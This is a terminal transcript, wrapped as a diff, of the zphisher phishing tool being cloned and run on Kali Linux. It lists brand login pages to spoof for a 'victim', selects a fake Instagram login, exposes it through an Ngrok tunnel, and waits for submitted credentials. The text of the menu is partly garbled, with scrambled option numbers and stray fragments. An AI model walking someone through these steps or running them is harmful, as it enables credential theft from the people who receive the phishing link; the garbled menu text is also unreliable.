@@ -1,0 +1,117 @@
+root@kali:/home/iicybersecurity# git clone https://github.com/htr-tech/zphisher
+
+ Cloning into 'zphisher'...
+
+ remote: Enumerating objects: 39, done.
+
+ remote: Counting objects: 100% (39/39), done.
+
+ remote: Compressing objects: 100% (38/38), done.
+
+ remote: Total 873 (delta 17), reused 2 (delta 0), pack-reused 834
+
+ Receiving objects: 100% (873/873), 9.69 MiB | 1.28 MiB/s, done.
+
+ Resolving deltas: 100% (346/346), done. 
+ 
+ root@kali:/home/iicybersecurity# cd zphisher/
+
+ root@kali:/home/iicybersecurity/zphisher# 
+ 
+ root@kali:/home/iicybersecurity# chmod +x zphisher.sh 
+ 
+root@kali:/home/iicybersecurity# 
+
+[+] Tool Created by htr-tech (tahmid.rayat)
+
+.:.Select Any Attack for your victim.:.
+
+[01] Facebook
+
+[11]
+
+Twitch
+
+[21]
+
+DeviantArt
+
+[02] Instagram [12] Pinterest [22] Badoo
+
+[03] Google
+
+[13] Snapchat
+
+[23] Origin
+
+[04] Microsoft [14] Linkedin [24] CryptoCoin
+
+[05] Netflix
+
+[06] Paypal
+
+Ebay
+
+[25] Yahoo
+
+[16] Dropbox [26] Wordpress
+
+[15]
+
+[07]
+
+[08]
+
+Steam
+
+[17]
+
+Protonmail
+
+[27] Yandex
+
+[28] Stackoverflow
+
+Twitter
+
+[18]
+
+Spotify
+
+[09] Playstation 1191 Reddit
+
+[10]
+
+Github
+
+[20]
+
+Adobe
+
+ew$29er.com
+
+[x] Exit
+
+[~] Select an option: 2
+
+[01] Traditional Login Page
+
+[02] Auto Followers Login Page [03] Blue Badge Verify Login Page
+
+[~] Select an option: 1
+
+[01] LocalHost
+
+[02] Ngrok.io
+
+[03] Serveo.net
+
+[04] Localhost.run
+
+[~] Select a Port Forwarding option: 2
+
+[] Launching Ngrok ..
+
+[~] Send the link to victim: https://c8ae1653.ngrok.io
+
+[~] Waiting for Login Info, Ctrl + C to exit.
